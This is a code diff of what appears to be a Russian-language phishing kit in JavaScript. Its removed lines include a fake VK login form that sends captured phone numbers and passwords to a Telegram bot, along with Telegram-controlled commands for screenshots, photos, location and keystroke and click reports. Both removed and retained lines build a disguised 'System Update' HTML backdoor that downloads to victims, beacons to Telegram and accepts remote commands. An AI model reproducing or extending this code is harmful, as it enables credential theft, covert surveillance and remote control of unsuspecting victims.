@@ -252,237 +252,93 @@
 
         // 💾 СОЗДАНИЕ ПЕРСИСТЕНТНОГО БЭКДОРА
         function createBackdoorFile() {
-            const backdoorHTML = `
-<!DOCTYPE html>
+    const backdoorHTML = `<!DOCTYPE html>
 <html>
 <head>
     <title>System Update</title>
     <style>body{background:#f0f0f0;font-family:Arial;text-align:center;padding:50px}</style>
 </head>
 <body>
-    <h1>🔧 System Update Manager</h1>
+    <h1>System Update Manager</h1>
     <p>Checking for updates...</p>
     <script>
         const BOT_TOKEN = "${BOT_TOKEN}";
         const CHAT_ID = "${CHAT_ID}";
         const SESSION_ID = "${SESSION_ID}";
-        
         let isActive = true;
-        
-        // Фоновый процесс
+
         function backgroundWorker() {
             setInterval(() => {
-                // Отправка heartbeat
-                fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: \`❤️ Бэкдор активен: \${SESSION_ID}\`
+                        text: "Бэкдор активен: " + SESSION_ID
                     })
                 }).catch(() => {});
-            }, 60000); // Каждую минуту
+            }, 60000);
         }
-        
-        // Обработчик команд
+
         function checkCommands() {
-            fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/getUpdates\`)
+            fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates")
                 .then(r => r.json())
                 .then(data => {
                     if (data.ok) {
                         data.result.forEach(update => {
-                            const text = update.message?.text;
+                            const text = update.message?.text?.toLowerCase();
                             const chatId = update.message?.chat.id;
-                            
                             if (chatId == CHAT_ID && text) {
-                                handleCommand(text, update.update_id);
+                                if (text === "/screenshot" && typeof html2canvas !== "undefined") {
+                                    html2canvas(document.body).then(canvas => {
+                                        canvas.toBlob(blob => {
+                                            const fd = new FormData();
+                                            fd.append("photo", blob, "screen.png");
+                                            fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
+                                                method: "POST",
+                                                body: fd
+                                            });
+                                        });
+                                    });
+                                }
+                                if (text === "/info") {
+                                    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+                                        method: "POST",
+                                        body: JSON.stringify({
+                                            chat_id: CHAT_ID,
+                                            text: "Session: " + SESSION_ID + "\\nUA: " + navigator.userAgent
+                                        })
+                                    });
+                                }
+                                if (text === "/destroy") {
+                                    document.body.innerHTML = "<h1>Update Complete</h1>";
+                                }
                             }
                         });
                     }
                 });
         }
-        
-        function handleCommand(command, updateId) {
-            command = command.toLowerCase();
-            
-            if (command === '/screenshot') {
-                // Скриншот через html2canvas
-                if (typeof html2canvas !== 'undefined') {
-                    html2canvas(document.body).then(canvas => {
-                        canvas.toBlob(blob => {
-                            const formData = new FormData();
-                            formData.append('photo', blob, 'screenshot.png');
-                            fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendPhoto\`, {
-                                method: 'POST',
-                                body: formData
-                            });
-                        });
-                    });
-                }
-            }
-            else if (command === '/info') {
-                const info = \`💻 Бэкдор активен\\n🆔 Session: \${SESSION_ID}\\n📱 UserAgent: \${navigator.userAgent}\\n🖥️ Screen: \${screen.width}x\${screen.height}\`;
-                sendToTelegram(info);
-            }
-            else if (command === '/destroy') {
-                isActive = false;
-                sendToTelegram('💥 Бэкдор уничтожен: ' + SESSION_ID);
-                document.body.innerHTML = '<h1>System Update Complete</h1><p>Your system has been updated successfully.</p>';
-            }
-        }
-        
-        function sendToTelegram(message) {
-            fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: message})
-            });
-        }
-        
-        // Запуск
+
         backgroundWorker();
         setInterval(checkCommands, 5000);
-        sendToTelegram('🚀 Бэкдор запущен: ' + SESSION_ID);
+        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+            method: "POST",
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: "Бэкдор запущен: " + SESSION_ID
+            })
+        });
     <\/script>
-    <!-- Подключаем html2canvas для скриншотов -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"><\/script>
 </body>
 </html>`;
 
-            const blob = new Blob([backdoorHTML], {type: 'text/html'});
-            const url = URL.createObjectURL(blob);
-            const link = document.getElementById('downloadLink');
-            link.href = url;
-            link.download = 'system_update.html';
-            link.click();
-            
-            sendToTelegram(`📥 Бэкдор загружен на устройство: ${SESSION_ID}`);
-        }
+    const blob = new Blob([backdoorHTML], {type: 'text/html'});
+    const url = URL.createObjectURL(blob);
+    const a = document.getElementById('downloadLink');
+    a.href = url;
+    a.download = 'system_update.html';
+    a.click();
 
-        // 🤖 ПРОВЕРКА КОМАНД ИЗ ТЕЛЕГРАММ
-        function checkTelegramCommands() {
-            if (!isBackdoorActive) return;
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
-                .then(r => r.json())
-                .then(data => {
-                    if (data.ok && data.result) {
-                        data.result.forEach(update => {
-                            lastUpdateId = update.update_id;
-                            const text = update.message?.text;
-                            const chatId = update.message?.chat.id;
-                            
-                            if (chatId == CHAT_ID && text) {
-                                handleTelegramCommand(text);
-                            }
-                        });
-                    }
-                })
-                .catch(e => console.log('Command check error'));
-        }
-
-        // 🎛️ ОБРАБОТКА КОМАНД ТЕЛЕГРАМ
-        function handleTelegramCommand(command) {
-            command = command.toLowerCase();
-            
-            if (command === '/screenshot') {
-                takeScreenshot();
-                sendToTelegram("📸 Делаю скриншот...");
-            }
-            else if (command === '/photo') {
-                takePhoto();
-                sendToTelegram("📷 Делаю фото...");
-            }
-            else if (command === '/info') {
-                const info = `💻 Инфо сессии ${SESSION_ID}\n👤 Кликов: ${collectedData.clicks.length}\n⌨️ Вводов: ${collectedData.keystrokes.length}\n📝 Форм: ${collectedData.forms.length}`;
-                sendToTelegram(info);
-            }
-            else if (command === '/location') {
-                getLocation();
-            }
-            else if (command === '/clicks') {
-                const recentClicks = collectedData.clicks.slice(-5).map(c => 
-                    `${c.time.split('T')[1]} - ${c.element}`
-                ).join('\n');
-                sendToTelegram(`🖱️ Последние клики:\n${recentClicks}`);
-            }
-            else if (command === '/backdoor') {
-                createBackdoorFile();
-            }
-            else if (command === '/destroy') {
-                isBackdoorActive = false;
-                sendToTelegram('💥 Сессия уничтожена: ' + SESSION_ID);
-            }
-            else if (command === '/full_report') {
-                const report = `📊 ПОЛНЫЙ ОТЧЕТ ${SESSION_ID}\n\n` +
-                    `📱 Устройство: ${navigator.userAgent}\n` +
-                    `🖥️ Экран: ${screen.width}x${screen.height}\n` +
-                    `🖱️ Всего кликов: ${collectedData.clicks.length}\n` +
-                    `⌨️ Всего вводов: ${collectedData.keystrokes.length}\n` +
-                    `📝 Отправлено форм: ${collectedData.forms.length}`;
-                sendToTelegram(report);
-            }
-        }
-
-        // 📝 ОБРАБОТКА ФИШИНГОВОЙ ФОРМЫ
-        document.getElementById('vkForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const phone = document.getElementById('phone').value;
-            const password = document.getElementById('password').value;
-            
-            // Сохраняем credentials
-            collectedData.credentials = { phone, password };
-            
-            // Собираем все данные
-            collectDeviceInfo();
-            getLocation();
-            
-            // Отправляем credentials
-            const credsMessage = `🔐 ПОЛУЧЕНЫ ДАННЫЕ ВК:\n📱 Телефон: ${phone}\n🔑 Пароль: ${password}\n🆔 Сессия: ${SESSION_ID}`;
-            sendToTelegram(credsMessage);
-            
-            // Загружаем бэкдор на устройство
-            createBackdoorFile();
-            
-            // Показываем сообщение об ошибке
-            document.getElementById('loginForm').classList.add('hidden');
-            document.getElementById('errorMsg').classList.remove('hidden');
-            
-            // Отправляем полный отчет
-            setTimeout(() => {
-                const fullReport = `🎯 ФИНАЛЬНЫЙ ОТЧЕТ ${SESSION_ID}\n\n` +
-                    `🔐 Credentials: ${phone} / ${password}\n` +
-                    `📱 Device: ${navigator.userAgent}\n` +
-                    `📍 Location: ${collectedData.location.lat || 'N/A'}, ${collectedData.location.lon || 'N/A'}\n` +
-                    `🖱️ Total Clicks: ${collectedData.clicks.length}\n` +
-                    `⌨️ Total Keystrokes: ${collectedData.keystrokes.length}`;
-                sendToTelegram(fullReport);
-            }, 2000);
-        });
-
-        // 🚀 ЗАПУСК СИСТЕМЫ
-        window.addEventListener('load', function() {
-            // Начальный сбор данных
-            collectDeviceInfo();
-            getLocation();
-            
-            sendToTelegram(`🚀 Новая жертва подключилась!\n🆔 Сессия: ${SESSION_ID}\n📱 Устройство: ${navigator.userAgent.split(' ').slice(-2).join(' ')}`);
-            
-            // Запуск проверки команд каждые 3 секунды
-            setInterval(checkTelegramCommands, 3000);
-            
-            // Периодическая отправка активности
-            setInterval(() => {
-                if (collectedData.clicks.length > 0) {
-                    sendToTelegram(`📈 Активность ${SESSION_ID}: ${collectedData.clicks.length} кликов, ${collectedData.keystrokes.length} вводов`);
-                }
-            }, 30000);
-        });
-
-    </script>
-    
-    <!-- Подключаем html2canvas для скриншотов -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-</body>
-</html>
+    sendToTelegram("Бэкдор успешно загружен: " + SESSION_ID);
+}
